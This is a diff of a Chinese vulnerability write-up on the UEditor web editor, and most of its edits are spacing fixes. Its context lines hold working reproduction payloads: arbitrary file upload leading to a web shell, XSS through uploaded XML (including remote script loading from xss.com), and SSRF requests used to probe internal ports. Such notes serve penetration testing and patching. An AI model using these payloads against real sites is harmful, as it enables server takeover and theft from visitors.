@@ -2,11 +2,17 @@
 
 ## 漏洞描述
 
-UEditor 是由百度「FEX前端研发团队」开发的所见即所得富文本web编辑器，具有轻量，可定制，注重用户体验等特点，开源基于MIT协议，允许自由使用和修改代码。
+UEditor 是由百度「FEX 前端研发团队」开发的所见即所得富文本 web 编辑器，具有轻量，可定制，注重用户体验等特点，开源基于 MIT 协议，允许自由使用和修改代码。
 
 界面如下：
 
 ![ueditor-1](images/ueditor-1.webp)
+
+查看版本：
+
+```
+console.log(UE.version)
+```
 
 ## 漏洞复现
 
@@ -24,9 +30,9 @@ image 目录文件读取：
 http://www.xxxx.com/ueditor/net/controller.ashx?action=listimage
 ```
 
-### 0x02 .net版本 任意文件上传
+### 0x02 .net 版本 任意文件上传
 
-只适用于 .net 版本，存在于`1.4.3.3`、`1.5.0`和`1.3.6`版本中。
+只适用于 .net 版本，存在于 `1.4.3.3`、`1.5.0` 和 `1.3.6` 版本中。
 
 准备一台服务区存放图片马或者需要上传的文件，本地构造一个 `html` 页面用于上传使用
 
@@ -52,9 +58,7 @@ http://xxxx/1.gif?.aspx
 
 ![ueditor-3](images/ueditor-3.webp)
 
-
-
-### 0x03 php版本文件上传
+### 0x03 php 版本文件上传
 
 poc：
 
@@ -83,7 +87,7 @@ shell路径由CONFIG[imagePathFormat]=ueditor/php/upload/fuck决定
 http://localhost/ueditor/php/upload/fuck.php
 ```
 
-### 0x03 存储型xss
+### 0x03 存储型 xss
 
 ```
 <html>
@@ -117,7 +121,7 @@ http://localhost/ueditor/php/upload/fuck.php
 /ueditor/jsp/controller.jsp?action=uploadimage
 ```
 
-将`uploadimage`类型改为`uploadfile`，修改文件后缀名为`.xml`：
+将 `uploadimage` 类型改为 `uploadfile`，修改文件后缀名为 `.xml`：
 
 ![ueditor-4](images/ueditor-4.webp)
 
@@ -125,21 +129,21 @@ http://localhost/ueditor/php/upload/fuck.php
 
 ![ueditor-5](images/ueditor-5.webp)
 
-#### 一些常见的xml弹窗poc
+#### 一些常见的 xml 弹窗 poc
 
-弹窗xss：
+弹窗 xss：
 
 ```
 <html><head></head><body><something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1);</something:script></body></html>
 ```
 
-url跳转：
+url 跳转：
 
 ```
 <html><head></head><body><something:script xmlns:something="http://www.w3.org/1999/xhtml">window.location.href="https://www.t00ls.net/";</something:script></body></html>
 ```
 
-远程加载js：
+远程加载 js：
 
 ```
 <html><head></head><body><something:script src="http://xss.com/xss.js" xmlns:something="http://www.w3.org/1999/xhtml"></something:script></body></html>
@@ -147,9 +151,9 @@ url跳转：
 
 ### 0x04 ssrf
 
-该漏洞存在于`1.4.3`的`jsp版本`中，`1.4.3.1`版本已经修复。
+该漏洞存在于 `1.4.3` 的 `jsp版本` 中，`1.4.3.1` 版本已经修复。
 
-该版本ueditor的ssrf触发点：
+该版本 ueditor 的 ssrf 触发点：
 
 ```php
 /jsp/controller.jsp?action=catchimage&source[]=
@@ -157,7 +161,7 @@ url跳转：
 /php/controller.php?action=catchimage&source[]=
 ```
 
-使用百度logo构造poc：
+使用百度 logo 构造 poc：
 
 ```
 http://xxx/cmd/ueditor/jsp/controller.jsp?action=catchimage&source[]=https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png
@@ -173,25 +177,25 @@ http://xxx/cmd/ueditor/jsp/controller.jsp?action=catchimage&source[]=https://www
 
 判断该地址对应的主机端口是否开放：
 
-- 如果抓取不存在的图片地址时，页面返回如下，即state为"远程连接出错"。
+- 如果抓取不存在的图片地址时，页面返回如下，即 state 为 " 远程连接出错 "。
 
 ```
 {"state": "SUCCESS", list:[{"state":"\u8fdc\u7a0b\u8fde\u63a5\u51fa\u9519"} ]}
 ```
 
-- 如果成功抓取到图片，页面返回如下，即state为"SUCCESS"。
+- 如果成功抓取到图片，页面返回如下，即 state 为 "SUCCESS"。
 
 ```
 {"state": "SUCCESS", list: [{"state":"SUCCESS","size":"5103","source":"http://192.168.135.133:8080/tomcat.png","title":"1527173588127099881.png","url":"/ueditor/jsp/upload/image/20180524/1527173588127099881.png"}]}
 ```
 
-- 如果主机无法访问，页面返回如下，即state为"抓取远程图片失败"。
+- 如果主机无法访问，页面返回如下，即 state 为 " 抓取远程图片失败 "。
 
 ```
 {"state":"SUCCESS", list: [{"state":"\u6293\u53d6\u8fdc\u7a0b\u56fe\u7247\u5931\u8d25"}]}
 ```
 
-还有一个版本的ssrf漏洞 ，存在于onethink 1.0中的ueditor，测试版本为1.2。poc：
+还有一个版本的 ssrf 漏洞 ，存在于 onethink 1.0 中的 ueditor，测试版本为 1.2。poc：
 
 ```
 POST http://xxx/Public/static/ueditor/php/getRemoteImage.php HTTP/1.1
@@ -206,4 +210,3 @@ Connection: keep-alive
 
 upfile=https://www.google.com/?%23.jpg
 ```
-
